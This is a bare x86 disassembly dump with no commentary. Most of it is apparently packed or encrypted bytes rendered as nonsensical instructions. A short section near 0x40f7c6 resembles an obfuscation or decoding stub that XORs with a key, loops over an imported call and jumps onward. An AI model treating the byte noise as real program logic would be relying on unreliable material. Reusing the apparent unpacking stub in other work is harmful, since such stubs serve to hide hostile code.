  40f26b:	sub    ecx,DWORD PTR [ecx-0x555eabb]
  40f271:	into   
  40f272:	bound  ebx,QWORD PTR [edi]
  40f274:	and    DWORD PTR [ecx],edx
  40f276:	cli    
  40f277:	push   0x40
  40f279:	or     DWORD PTR [esi-0x18],0xf1c4cb26
  40f280:	xchg   ecx,eax
  40f281:	aas    
  40f282:	push   esp
  40f283:	mov    ecx,0x4687627c
  40f288:	nop
  40f289:	nop
  40f28a:	mov    al,0x68
  40f28c:	inc    ecx
  40f28d:	jg     0x40f2b7
  40f28f:	pop    ebp
  40f290:	mov    ecx,0x7dbad5f
  40f295:	pusha  
  40f296:	mov    esp,DWORD PTR [eax]
  40f298:	xchg   BYTE PTR [edi+0x2084e621],al
  40f29e:	inc    esp
  40f29f:	fistp  QWORD PTR [ecx]
  40f2a1:	inc    esp
  40f2a2:	mov    ds:0x49a02cd6,eax
  40f2a7:	jo     0x40f29e
  40f2a9:	jg     0x40f24a
  40f2ab:	adc    dl,al
  40f2ad:	jg     0x40f2ff
  40f2af:	ins    DWORD PTR es:[edi],dx
  40f2b0:	xor    eax,DWORD PTR [ebp-0x50afde23]
  40f2b6:	ins    BYTE PTR es:[edi],dx
  40f2b7:	enter  0xe8b8,0xcd
  40f2bb:	jmp    0x4b42711e
  40f2c0:	add    BYTE PTR [edi],dh
  40f2c2:	arpl   sp,bx
  40f2c4:	iret   
  40f2c5:	pop    ds
  40f2c6:	scas   eax,DWORD PTR es:[edi]
  40f2c7:	lds    ebp,FWORD PTR [esi+0x75e95e16]
  40f2cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2ce:	and    BYTE PTR [esi+0x56],ch
  40f2d1:	xchg   edi,eax
  40f2d2:	adc    BYTE PTR [edx+0x381e64b8],al
  40f2d8:	outs   dx,DWORD PTR ds:[esi]
  40f2d9:	xchg   ebp,eax
  40f2da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f2db:	dec    edx
  40f2dc:	std    
  40f2dd:	mov    dh,0xe5
  40f2df:	cmp    DWORD PTR [edx],0xaa0f9e92
  40f2e5:	mov    al,ds:0x6daf8c7e
  40f2ea:	lods   al,BYTE PTR ds:[esi]
  40f2eb:	imul   ebp,esp,0x2a
  40f2ee:	test   eax,0xd746ff4c
  40f2f3:	les    eax,FWORD PTR [edx+0x18adae69]
  40f2f9:	rcr    BYTE PTR [esi],1
  40f2fb:	and    eax,0x71828804
  40f300:	lds    esp,FWORD PTR [eax+edx*1]
  40f303:	(bad)  
  40f304:	iret   
  40f305:	mov    DWORD PTR [ebx+0x622a736e],eax
  40f30b:	les    esp,FWORD PTR [ecx+0x55]
  40f30e:	and    BYTE PTR [ecx+0x297c7c21],ch
  40f314:	in     al,dx
  40f315:	dec    edi
  40f316:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f317:	mov    ecx,0x494101ba
  40f31c:	sub    DWORD PTR [esi-0x780bf84d],edi
  40f322:	xor    edi,edx
  40f324:	cld    
  40f325:	xor    al,0xa6
  40f327:	aam    0x62
  40f329:	or     eax,esi
  40f32b:	jle    0x40f374
  40f32d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f32e:	pusha  
  40f32f:	jae    0x40f38e
  40f331:	xor    DWORD PTR [edi+0xc],esp
  40f334:	arpl   WORD PTR [ebp-0x59],di
  40f337:	xchg   esi,eax
  40f338:	cmp    al,0xcf
  40f33a:	icebp  
  40f33b:	sahf   
  40f33c:	int3   
  40f33d:	pusha  
  40f33e:	fistp  WORD PTR [ecx-0x24]
  40f341:	mov    ecx,0x72d9a38f
  40f346:	mov    BYTE PTR [edi],bh
  40f348:	push   esi
  40f349:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f34a:	fs jns 0x40f333
  40f34d:	xor    BYTE PTR [ebx+0x27ff1a19],dh
  40f353:	pop    ebp
  40f354:	adc    ebx,DWORD PTR [ebx-0x7f633a5a]
  40f35a:	(bad)  [ecx-0x6d488c1e]
  40f360:	adc    eax,0x8c8026a4
  40f365:	jl     0x40f363
  40f367:	sub    bh,0x8e
  40f36a:	daa    
  40f36b:	add    eax,0x3c921e3
  40f370:	mov    edi,0x2d2e8623
  40f375:	aas    
  40f376:	arpl   cx,bx
  40f378:	sbb    BYTE PTR es:0xdb1bfe47,dh
  40f37f:	cdq    
  40f380:	ss in  eax,0x96
  40f383:	pop    esp
  40f384:	inc    esp
  40f385:	repz mov ah,0x66
  40f388:	outs   dx,BYTE PTR ds:[esi]
  40f389:	jae    0x40f37e
  40f38b:	dec    edx
  40f38c:	outs   dx,DWORD PTR ds:[esi]
  40f38d:	lods   eax,DWORD PTR ds:[esi]
  40f38e:	popf   
  40f38f:	push   ebx
  40f390:	sub    DWORD PTR [edx+eax*2],eax
  40f393:	sub    BYTE PTR [ecx+0x78],dl
  40f396:	mov    cl,0xb9
  40f398:	xchg   edi,eax
  40f399:	cmc    
  40f39a:	jl     0x40f3b5
  40f39c:	xor    esi,DWORD PTR [edx+eiz*2-0x25fc97a7]
  40f3a3:	and    esi,DWORD PTR [edx-0x6e]
  40f3a6:	adc    BYTE PTR [ebp-0x50],bl
  40f3a9:	sahf   
  40f3aa:	hlt    
  40f3ab:	sbb    BYTE PTR [ebp+0x60],al
  40f3ae:	scas   eax,DWORD PTR es:[edi]
  40f3af:	ds int 0x94
  40f3b2:	mov    BYTE PTR [ebx-0x93a6094],ch
  40f3b8:	pop    edx
  40f3b9:	inc    edi
  40f3ba:	ds fxch st(4)
  40f3bd:	test   DWORD PTR [esi+0x39de1527],0x4024e35a
  40f3c7:	stos   BYTE PTR es:[edi],al
  40f3c8:	lea    ecx,[edx-0x72955057]
  40f3ce:	shl    DWORD PTR [edi+0x5d2c80b1],cl
  40f3d4:	aam    0x5f
  40f3d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f3d7:	jl     0x40f3e3
  40f3d9:	xor    dh,0x40
  40f3dc:	ins    BYTE PTR es:[edi],dx
  40f3dd:	mov    eax,ds:0xde949ad0
  40f3e2:	jbe    0x40f382
  40f3e4:	jb     0x40f3ef
  40f3e6:	call   0x74b899e
  40f3eb:	neg    BYTE PTR [ecx+eiz*2]
  40f3ee:	into   
  40f3ef:	jns    0x40f423
  40f3f1:	add    BYTE PTR [esi+0x5fbb258c],dl
  40f3f7:	mov    ah,0x84
  40f3f9:	(bad)  
  40f3fa:	adc    DWORD PTR [edi],edi
  40f3fc:	retf   0x8c8d
  40f3ff:	sar    al,1
  40f401:	mov    ah,0x98
  40f403:	les    edx,FWORD PTR [eax]
  40f405:	add    BYTE PTR [esi+0x10],0x30
  40f409:	push   ebp
  40f40a:	sub    al,0xbc
  40f40c:	ss inc eax
  40f40e:	stos   BYTE PTR es:[edi],al
  40f40f:	pop    edx
  40f410:	sbb    BYTE PTR [ecx+eiz*1-0x69],ch
  40f414:	inc    esi
  40f415:	pop    ebx
  40f416:	cld    
  40f417:	std    
  40f418:	xor    esi,DWORD PTR [edi-0x70]
  40f41b:	push   edi
  40f41c:	iret   
  40f41d:	xchg   ebx,eax
  40f41e:	sub    esi,DWORD PTR [ecx-0x77]
  40f421:	aad    0x7e
  40f423:	cs (bad) 
  40f425:	pushf  
  40f426:	fdiv   st(7),st
  40f428:	mov    ds:0xbf6b478c,al
  40f42d:	paddw  mm1,mm6
  40f430:	das    
  40f431:	xor    dh,ch
  40f433:	mov    bl,0x8a
  40f435:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f436:	and    DWORD PTR [edx],ebx
  40f438:	pop    es
  40f439:	fdiv   DWORD PTR [esp+eax*8+0x42]
  40f43d:	sar    DWORD PTR [eax+0x5a],cl
  40f440:	test   ch,bl
  40f442:	ins    BYTE PTR es:[edi],dx
  40f443:	cld    
  40f444:	rcl    BYTE PTR [edi-0x17],1
  40f447:	adc    BYTE PTR [ebp+ecx*8-0x5029f531],al
  40f44e:	xor    ecx,ebx
  40f450:	push   eax
  40f451:	sbb    BYTE PTR [edx],bh
  40f453:	push   ebp
  40f454:	shl    cl,0xa4
  40f457:	cmp    eax,0xc3343627
  40f45c:	and    ch,BYTE PTR [esi-0x5a87b038]
  40f462:	mov    DWORD PTR [edx],ecx
  40f464:	ret    
  40f465:	sub    al,0xd2
  40f467:	adc    eax,0xe00baa91
  40f46c:	add    DWORD PTR [edi],ebx
  40f46e:	call   0xadb70876
  40f473:	ret    0x6d77
  40f476:	push   ecx
  40f477:	dec    esp
  40f478:	fisttp DWORD PTR [eax]
  40f47a:	push   edi
  40f47b:	adc    bh,BYTE PTR [edx-0x66]
  40f47e:	and    al,0x35
  40f480:	or     al,0xc4
  40f482:	jmp    0x3159:0x2528f59
  40f489:	in     eax,dx
  40f48a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f48b:	or     eax,0x5fd40bad
  40f490:	enter  0xe847,0x8c
  40f494:	and    dh,bh
  40f496:	pop    eax
  40f497:	pop    edi
  40f498:	in     al,dx
  40f499:	rcr    DWORD PTR [edi-0x3ecc6ab9],cl
  40f49f:	outs   dx,DWORD PTR ds:[esi]
  40f4a0:	iret   
  40f4a1:	out    0xc5,al
  40f4a3:	mov    eax,0x6fc69e83
  40f4a8:	cli    
  40f4a9:	clc    
  40f4aa:	repz jnp 0x40f496
  40f4ad:	push   ecx
  40f4ae:	bound  eax,QWORD PTR [ebp-0x2848b946]
  40f4b4:	mov    al,ds:0x63f59d8e
  40f4b9:	lahf   
  40f4ba:	jmp    edi
  40f4bc:	lahf   
  40f4bd:	pop    esp
  40f4be:	data16 add al,0x5e
  40f4c1:	daa    
  40f4c2:	and    dh,BYTE PTR [eax]
  40f4c4:	adc    DWORD PTR [ebx],edi
  40f4c6:	mov    eax,ds:0x90714590
  40f4cb:	test   al,0x7
  40f4cd:	cmp    al,0x3
  40f4cf:	jo     0x40f476
  40f4d1:	jge    0x40f4a7
  40f4d3:	jecxz  0x40f47f
  40f4d5:	jmp    0xf237:0xb8e62ff6
  40f4dc:	sub    al,0xe
  40f4de:	cli    
  40f4df:	test   DWORD PTR [eax+0x4800d21e],0xdcda4df3
  40f4e9:	aas    
  40f4ea:	jl     0x40f524
  40f4ec:	mov    al,0x1b
  40f4ee:	hlt    
  40f4ef:	dec    ecx
  40f4f0:	push   es
  40f4f1:	jns    0x40f50e
  40f4f3:	mov    BYTE PTR [esi+0x4],bl
  40f4f6:	out    dx,eax
  40f4f7:	add    ebp,ecx
  40f4f9:	es adc al,0xad
  40f4fc:	(bad)  
  40f4fd:	xor    ebx,edi
  40f4ff:	stc    
  40f500:	xchg   ecx,eax
  40f501:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f502:	enter  0x9bb,0xc8
  40f506:	fstp   QWORD PTR [ecx-0x4372eb81]
  40f50c:	gs jecxz 0x40f4bf
  40f50f:	imul   edi,DWORD PTR [edx+0x71809ece],0x30
  40f516:	sbb    ch,BYTE PTR [eax+0x20]
  40f519:	jnp    0x40f4f2
  40f51b:	jne    0x40f4bb
  40f51d:	pop    ebx
  40f51e:	push   esp
  40f51f:	cli    
  40f520:	in     al,dx
  40f521:	data16 cmc 
  40f523:	dec    edx
  40f524:	out    0xb6,eax
  40f526:	xchg   ebx,eax
  40f527:	xor    BYTE PTR [bp+si],ah
  40f52a:	sub    DWORD PTR ds:0x5223b0ee,edx
  40f530:	dec    edx
  40f531:	mov    DWORD PTR [esp+edx*4-0x4e],0xa7a841d
  40f539:	jmp    0xe0ae0a0d
  40f53e:	test   bh,cl
  40f540:	mov    esi,0x3c25d79d
  40f545:	mov    ebp,0xf314198d
  40f54a:	stos   BYTE PTR es:[edi],al
  40f54b:	lods   eax,DWORD PTR ds:[esi]
  40f54c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f54d:	push   ds
  40f54e:	or     DWORD PTR [ecx+0x29a45b09],edx
  40f554:	cmp    DWORD PTR [edx+0x159baff5],eax
  40f55a:	dec    edx
  40f55b:	mov    BYTE PTR [eax+0x58],dh
  40f55e:	mov    ch,0x9
  40f560:	ror    esp,cl
  40f562:	popa   
  40f563:	push   ecx
  40f564:	jecxz  0x40f586
  40f566:	(bad)  
  40f567:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f568:	ss (bad) 
  40f56a:	pop    edi
  40f56b:	pushf  
  40f56c:	inc    ecx
  40f56d:	pop    eax
  40f56e:	je     0x40f5cf
  40f570:	add    esp,ebp
  40f572:	push   ss
  40f573:	out    dx,eax
  40f574:	jns    0x40f58a
  40f576:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f577:	pop    ecx
  40f578:	lea    eax,[ebx+ecx*8+0x54]
  40f57c:	pop    esp
  40f57d:	adc    ah,BYTE PTR [edx+0x7d67091c]
  40f583:	fidiv  DWORD PTR [ebx]
  40f585:	pushf  
  40f586:	lods   eax,DWORD PTR ds:[esi]
  40f587:	ret    
  40f588:	xchg   DWORD PTR [edx-0x7a0350ec],edi
  40f58e:	adc    eax,0xdff75330
  40f593:	cmp    al,0x9d
  40f595:	adc    al,0xaf
  40f597:	test   DWORD PTR [ebx-0x521877db],ebx
  40f59d:	fiadd  WORD PTR [ecx]
  40f59f:	sub    ch,BYTE PTR [esi-0x63ac693e]
  40f5a5:	inc    ecx
  40f5a6:	dec    edi
  40f5a7:	test   al,0x86
  40f5a9:	pop    edx
  40f5aa:	cmp    BYTE PTR [ebx-0x67e6d0cf],0xb8
  40f5b1:	(bad)  
  40f5b2:	ins    DWORD PTR es:[edi],dx
  40f5b3:	pop    eax
  40f5b4:	sub    bl,cl
  40f5b6:	jle    0x40f577
  40f5b8:	lock call 0xc84c63ec
  40f5be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f5bf:	cmp    BYTE PTR [edx+0x4bd22960],ch
  40f5c5:	push   ss
  40f5c6:	test   al,al
  40f5c8:	les    edi,FWORD PTR [esi]
  40f5ca:	addr16 push eax
  40f5cc:	int    0x92
  40f5ce:	out    dx,al
  40f5cf:	and    cl,al
  40f5d1:	pusha  
  40f5d2:	shr    DWORD PTR [edi-0x530ea0a0],0xce
  40f5d9:	mov    esp,0x79c264f7
  40f5de:	and    DWORD PTR [edi-0x27e78a6b],esp
  40f5e4:	dec    ecx
  40f5e5:	mov    ch,0x39
  40f5e7:	arpl   cx,si
  40f5e9:	lahf   
  40f5ea:	or     esp,DWORD PTR [esi-0x26]
  40f5ed:	jo     0x40f635
  40f5ef:	sub    al,0x0
  40f5f1:	(bad)  
  40f5f2:	fiadd  WORD PTR [ebx-0x75e7eba]
  40f5f8:	dec    ecx
  40f5f9:	push   cs
  40f5fa:	pop    ebx
  40f5fb:	and    eax,0x5e9bbcab
  40f600:	mov    ah,ch
  40f602:	rcl    BYTE PTR ds:0x9435a392,0xb6
  40f609:	pop    eax
  40f60a:	sti    
  40f60b:	in     al,0xb0
  40f60d:	push   ebx
  40f60e:	test   BYTE PTR [edx+0x5a],al
  40f611:	stc    
  40f612:	and    al,BYTE PTR [ebp+0x54]
  40f615:	inc    esi
  40f616:	sbb    esp,edx
  40f618:	clc    
  40f619:	xor    BYTE PTR [edx-0x60],0xf9
  40f61d:	int    0xd4
  40f61f:	sti    
  40f620:	and    eax,0x76cbefc3
  40f625:	adc    al,bh
  40f627:	xor    eax,0x3c155b82
  40f62c:	xor    ebx,DWORD PTR [ecx-0x63]
  40f62f:	jno    0x40f5be
  40f631:	sbb    DWORD PTR [eax+0x5a385d6f],edx
  40f637:	push   ecx
  40f638:	or     al,0xff
  40f63a:	xor    al,0xaa
  40f63c:	sub    al,0x48
  40f63e:	sbb    ah,BYTE PTR [ebp-0x11]
  40f641:	inc    esi
  40f642:	mov    esp,0x9297372e
  40f647:	out    0x85,eax
  40f649:	or     BYTE PTR [edx],al
  40f64b:	inc    ecx
  40f64c:	cwde   
  40f64d:	or     DWORD PTR [edx+0x520b7b67],0x91c8a795
  40f657:	pop    ss
  40f658:	ds (bad) 
  40f65b:	cmp    edi,DWORD PTR [ebx-0x2c601e2a]
  40f661:	hlt    
  40f662:	cwde   
  40f663:	lock into 
  40f665:	jb     0x40f625
  40f667:	push   0x3980a6f9
  40f66c:	xchg   esi,eax
  40f66d:	sahf   
  40f66e:	retf   0x511b
  40f671:	lds    eax,FWORD PTR [ebp+0x78]
  40f674:	jge    0x40f6df
  40f676:	fisttp WORD PTR [edi]
  40f678:	repnz adc BYTE PTR [eax-0x50],bh
  40f67c:	sub    dl,al
  40f67e:	jmp    0x638e:0xa799e4ab
  40f685:	cmp    BYTE PTR [ebp+0x2e221820],dh
  40f68b:	repnz xchg ecx,eax
  40f68d:	es aaa 
  40f68f:	out    dx,al
  40f690:	mov    esi,0x7706ad56
  40f695:	mov    dl,0x47
  40f697:	pusha  
  40f698:	lahf   
  40f699:	jbe    0x40f69a
  40f69b:	adc    ebp,esp
  40f69d:	mov    eax,0x8ee5258c
  40f6a2:	xchg   BYTE PTR [edx+0x4e],dh
  40f6a5:	mov    esi,0xa02cf90c
  40f6aa:	ficom  WORD PTR [edi]
  40f6ac:	call   0xfa74:0x1f96eb6e
  40f6b3:	push   0xffffffd7
  40f6b5:	ror    DWORD PTR [edx],1
  40f6b7:	add    ah,BYTE PTR [esi-0x78]
  40f6ba:	ds in  al,0x85
  40f6bd:	xor    BYTE PTR [ebp+0x73b86991],0x36
  40f6c4:	daa    
  40f6c5:	or     al,0x9d
  40f6c7:	ret    
  40f6c8:	dec    edx
  40f6c9:	cs stos BYTE PTR es:[edi],al
  40f6cb:	sub    eax,0xcbfc1c28
  40f6d0:	push   esp
  40f6d1:	shl    BYTE PTR [edx+0x4346b15],1
  40f6d7:	pop    ebp
  40f6d8:	xor    DWORD PTR [eax],esi
  40f6da:	gs push edi
  40f6dc:	xchg   esi,eax
  40f6dd:	aas    
  40f6de:	add    dl,BYTE PTR [ecx]
  40f6e0:	inc    edx
  40f6e1:	push   ds
  40f6e2:	hlt    
  40f6e3:	fs dec edi
  40f6e5:	sub    ecx,ebp
  40f6e7:	shld   DWORD PTR [eax+0x5a],esi,0xcc
  40f6ec:	lahf   
  40f6ed:	sbb    BYTE PTR ds:[ebp-0x69],dl
  40f6f1:	mov    cl,0x2e
  40f6f3:	sti    
  40f6f4:	jns    0x40f741
  40f6f6:	ror    ebx,cl
  40f6f8:	mov    bl,0xb1
  40f6fa:	sti    
  40f6fb:	xor    edx,DWORD PTR [edx-0x7ca32ae]
  40f701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f702:	mov    DWORD PTR [ecx*8-0x79054645],ebx
  40f709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f70a:	inc    esi
  40f70b:	popa   
  40f70c:	adc    edx,ecx
  40f70e:	out    dx,eax
  40f70f:	test   edi,esi
  40f711:	push   0x3d
  40f713:	jno    0x40f720
  40f715:	mov    ebp,0x40cbe26
  40f71a:	cs outs dx,BYTE PTR cs:[esi]
  40f71d:	iret   
  40f71e:	ss int3 
  40f720:	add    BYTE PTR [edi-0x2be14355],dh
  40f726:	(bad)  
  40f727:	mov    esp,DWORD PTR [ecx+edi*2]
  40f72a:	repnz cmp ecx,DWORD PTR [esp+edx*1-0x30]
  40f72f:	pushf  
  40f730:	mov    ?,WORD PTR [esi-0x6c]
  40f733:	ss in  eax,dx
  40f735:	call   0x2454:0xa22a32da
  40f73c:	jnp    0x40f71e
  40f73e:	mov    cl,0xbd
  40f740:	(bad)  
  40f741:	inc    esi
  40f742:	jo     0x40f704
  40f744:	and    DWORD PTR ss:[esi+0x17385c1d],0x2a5c17c6
  40f74f:	out    0xbd,al
  40f751:	sub    edx,DWORD PTR [esi+0x3e615db]
  40f757:	pop    esi
  40f758:	scas   eax,DWORD PTR es:[edi]
  40f759:	xor    BYTE PTR [edi+0x68],0xc0
  40f75d:	call   0x3cee8cde
  40f762:	cld    
  40f763:	(bad)  [ebp-0x55e09eaa]
  40f769:	mov    ecx,0xc7209ecf
  40f76e:	lods   al,BYTE PTR ds:[esi]
  40f76f:	pop    es
  40f770:	aam    0xd6
  40f772:	pop    ebp
  40f773:	inc    ebp
  40f774:	sahf   
  40f775:	icebp  
  40f776:	jmp    0xf052:0x25c99b04
  40f77d:	popa   
  40f77e:	daa    
  40f77f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f780:	jg     0x40f749
  40f782:	mov    ecx,0xc1238aea
  40f787:	loop   0x40f72e
  40f789:	xor    eax,ecx
  40f78b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f78c:	hlt    
  40f78d:	fwait
  40f78e:	jns    0x40f74b
  40f790:	pop    esp
  40f791:	call   0xc4bfbd6c
  40f796:	jmp    0x40f736
  40f798:	adc    dh,cl
  40f79a:	in     al,0x85
  40f79c:	gs inc edx
  40f79e:	xlat   BYTE PTR ds:[ebx]
  40f79f:	push   ds
  40f7a0:	dec    ebp
  40f7a1:	(bad)  
  40f7a2:	pop    edx
  40f7a3:	sti    
  40f7a4:	(bad)  
  40f7a5:	jmp    0x8690cda
  40f7aa:	xchg   ebp,eax
  40f7ab:	clc    
  40f7ac:	xor    eax,0x649bd81e
  40f7b1:	inc    edx
  40f7b2:	jae    0x40f7a3
  40f7b4:	repz dec edi
  40f7b6:	jns    0x40f78e
  40f7b8:	mov    BYTE PTR [edi-0x20],al
  40f7bb:	jb     0x40f7d0
  40f7bd:	push   ss
  40f7be:	repz jmp 0x7355:0x6e9feb88
  40f7c6:	mov    ecx,0x75108b3
  40f7cb:	xor    eax,ecx
  40f7cd:	or     DWORD PTR ds:0x426ed1,0x426eb9
  40f7d7:	add    eax,0x3272fa
  40f7dc:	mov    DWORD PTR [edx],eax
  40f7de:	and    DWORD PTR ds:0x426ed5,0x0
  40f7e8:	jmp    0x40f7fb
  40f7ed:	xor    eax,eax
  40f7ef:	or     eax,DWORD PTR ds:0x426ed5
  40f7f5:	inc    eax
  40f7f6:	mov    ds:0x426ed5,eax
  40f7fb:	cmp    DWORD PTR ds:0x426ed5,0x14
  40f802:	jae    0x40f83d
  40f808:	cmp    DWORD PTR ds:0x426ed5,0x5
  40f80f:	jb     0x40f83d
  40f815:	jmp    0x40f820
  40f81a:	call   DWORD PTR ds:0x430a38
  40f820:	cmp    DWORD PTR ds:0x426ed5,0x4
  40f827:	jne    0x40f838
  40f82d:	mov    eax,ds:0x426ed5
  40f832:	inc    eax
  40f833:	mov    ds:0x426ed5,eax
  40f838:	jmp    0x40f7ed
  40f83d:	mov    eax,DWORD PTR [ebp+0xc]
  40f840:	xor    eax,ecx
  40f842:	push   esi
  40f843:	mov    esi,DWORD PTR [ebp+0x10]
  40f846:	mov    edx,0x3272fa
  40f84b:	add    eax,edx
  40f84d:	mov    DWORD PTR [esi+0x4],eax
  40f850:	mov    eax,DWORD PTR [ebp+0x14]
  40f853:	jmp    0x411bef
  40f858:	or     ecx,DWORD PTR [ecx+0x2a]
  40f85b:	mov    ds:0x7813f878,al
  40f860:	xor    al,0xd8
  40f862:	mov    edi,DWORD PTR ds:0xec85b19a
  40f868:	fwait
  40f869:	dec    esi
  40f86a:	jnp    0x40f8e7
  40f86c:	clc    
  40f86d:	pushf  
  40f86e:	jnp    0x40f8eb
  40f870:	pop    eax
  40f871:	jg     0x40f8a6
  40f873:	retf   
  40f874:	adc    cl,ah
  40f876:	and    eax,0x2cd08357
  40f87b:	jle    0x40f819
  40f87d:	outs   dx,BYTE PTR ds:[esi]
  40f87e:	fidivr WORD PTR [ecx+0x20]
  40f881:	mov    ebx,0x71416ddc
  40f886:	stos   BYTE PTR es:[edi],al
  40f887:	enter  0x5d5,0xcb
  40f88b:	frstor [esi]
  40f88d:	xor    BYTE PTR [eax-0x22ece40],bh
  40f893:	fisttp DWORD PTR [edx+esi*1-0x321bb1fa]
  40f89a:	sub    eax,0xfe016842
  40f89f:	push   ds
  40f8a0:	inc    esp
  40f8a1:	popf   
  40f8a2:	jns    0x40f922
  40f8a4:	pop    edi
  40f8a5:	ss clc 
  40f8a7:	sbb    DWORD PTR [edx+0x6bbc633b],0x127dbab0
  40f8b1:	stos   DWORD PTR es:[edi],eax
  40f8b2:	jmp    0x370f:0x8eaa447
  40f8b9:	scas   eax,DWORD PTR es:[edi]
  40f8ba:	xchg   ah,ah
  40f8bc:	cmp    ebp,DWORD PTR ds:0x43e7afca
  40f8c2:	push   es
  40f8c3:	scas   eax,DWORD PTR es:[edi]
  40f8c4:	jge    0x40f85e
  40f8c6:	call   0x901a4627
  40f8cb:	fs lock mov edx,0x5c37a71
  40f8d2:	into   
  40f8d3:	fucomi st,st(5)
  40f8d5:	jle    0x40f88a
  40f8d7:	inc    BYTE PTR [ebx]
  40f8d9:	leave  
  40f8da:	pop    esp
  40f8db:	mov    BYTE PTR [ebp+0x6b],cl
  40f8de:	mov    cl,al
  40f8e0:	jns    0x40f934
  40f8e2:	push   eax
  40f8e3:	xor    edx,ecx
  40f8e5:	aaa    
  40f8e6:	sbb    DWORD PTR [esi],edx
  40f8e8:	call   0x6ead7788
  40f8ed:	jecxz  0x40f969
  40f8ef:	xchg   DWORD PTR [ebx-0x35],ecx
  40f8f2:	lahf   
  40f8f3:	hlt    
  40f8f4:	mov    ebx,0x4e5f3be4
  40f8f9:	das    
  40f8fa:	arpl   WORD PTR [ebp+0x4d],ax
  40f8fd:	gs leave 
  40f8ff:	aaa    
  40f900:	and    al,0x3f
  40f902:	mov    esp,0x5b55e7c7
  40f907:	fwait
  40f908:	ret    
  40f909:	dec    ebx
  40f90a:	inc    ecx
  40f90b:	leave  
  40f90c:	or     ecx,DWORD PTR [eax]
  40f90e:	or     esp,DWORD PTR [edi-0x46635af4]
  40f914:	pop    edi
  40f915:	add    DWORD PTR [ecx+0x5f],esp
  40f918:	sahf   
  40f919:	dec    ecx
  40f91a:	leave  
  40f91b:	ret    0xcc7c
  40f91e:	pop    ds
  40f91f:	leave  
  40f920:	(bad)  [ecx-0x19]
  40f923:	retf   
  40f924:	cwde   
  40f925:	hlt    
  40f926:	xchg   esp,eax
  40f927:	loope  0x40f90a
  40f929:	aaa    
  40f92a:	sbb    edi,DWORD PTR [ebx]
  40f92c:	push   cs
  40f92d:	sub    ah,BYTE PTR [edx]
  40f92f:	sbb    ebp,esi
  40f931:	bound  ebx,QWORD PTR [ecx+0x39ca7e72]
  40f937:	cmp    BYTE PTR [edi-0x533b66f2],0xff
  40f93e:	sbb    DWORD PTR [ebx],0xffffff94
  40f941:	push   ebx
  40f942:	jp     0x40f976
  40f944:	scas   al,BYTE PTR es:[edi]
  40f945:	(bad)  
  40f946:	adc    al,ah
  40f948:	pop    es
  40f949:	sub    al,0x1b
  40f94b:	clc    
  40f94c:	push   ebx
  40f94d:	js     0x40f909
  40f94f:	popa   
  40f950:	adc    DWORD PTR [esi-0x28],0x59b68af
  40f957:	cmp    edx,ebp
  40f959:	adc    edx,DWORD PTR [ebp+0x48]
  40f95c:	nop
  40f95d:	push   0xeff018ca
  40f962:	jge    0x40f90a
  40f964:	jno    0x40f9d4
  40f966:	sbb    DWORD PTR [edi-0x43],ebp
  40f969:	pop    ebp
  40f96a:	test   al,0x1f
  40f96c:	mov    bh,0xfc
  40f96e:	das    
  40f96f:	dec    eax
  40f970:	clc    
  40f971:	mov    esi,0x7c8599d6
  40f976:	data16 arpl dx,cx
  40f979:	inc    esi
  40f97a:	inc    esi
  40f97b:	hlt    
  40f97c:	dec    esp
  40f97d:	push   es
  40f97e:	gs jl  0x40f95a
  40f981:	mov    al,ds:0xe28a8974
  40f986:	mov    dl,0x6a
  40f988:	cld    
  40f989:	out    0x94,al
  40f98b:	xchg   ecx,eax
  40f98c:	inc    edi
  40f98d:	mov    cl,0x3c
  40f98f:	pop    eax
  40f990:	dec    edx
  40f991:	xchg   esi,eax
  40f992:	cmp    edi,DWORD PTR [ebp+0x50]
  40f995:	stc    
  40f996:	push   cs
  40f997:	lds    eax,FWORD PTR [eax+ebp*8]
  40f99a:	xor    DWORD PTR [ebx-0x7951553f],ebx
  40f9a0:	scas   eax,DWORD PTR es:[edi]
  40f9a1:	test   DWORD PTR [edi-0x5c788ca7],ecx
  40f9a7:	fidiv  DWORD PTR [eax-0x48a9bf1e]
  40f9ad:	fist   DWORD PTR [ecx]
  40f9af:	fstp   st(2)
  40f9b1:	dec    eax
  40f9b2:	mov    ebx,0x88941099
  40f9b7:	mov    eax,0x6861653d
  40f9bc:	sbb    al,0x36
  40f9be:	mov    eax,ds:0x2898bd6d
  40f9c3:	jne    0x40f9db
  40f9c5:	sbb    eax,0xdfbfe484
  40f9ca:	or     eax,0x1b6bdc60
  40f9cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f9d0:	and    DWORD PTR [edi+esi*8-0x7de52bdd],edx
  40f9d7:	inc    esi
  40f9d8:	xor    al,0x27
  40f9da:	dec    edi
  40f9db:	jecxz  0x40f9ee
  40f9dd:	jle    0x40fa4b
  40f9df:	pop    ds
  40f9e0:	mov    dh,ch
  40f9e2:	xor    bl,BYTE PTR [esp+eax*8-0x37]
  40f9e6:	cmp    DWORD PTR [ebx],eax
  40f9e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f9e9:	pop    edx
  40f9ea:	gs push 0xffffffc2
  40f9ed:	int    0x5c
  40f9ef:	jg     0x40f9f6
  40f9f1:	push   es
  40f9f2:	loopne 0x40f9f7
  40f9f4:	jmp    0xd343ceee
  40f9f9:	mov    ds:0x94663782,al
  40f9fe:	push   eax
  40f9ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa00:	cmp    ebp,ebp
  40fa02:	fwait
  40fa03:	add    ch,BYTE PTR [edi+0x159ed797]
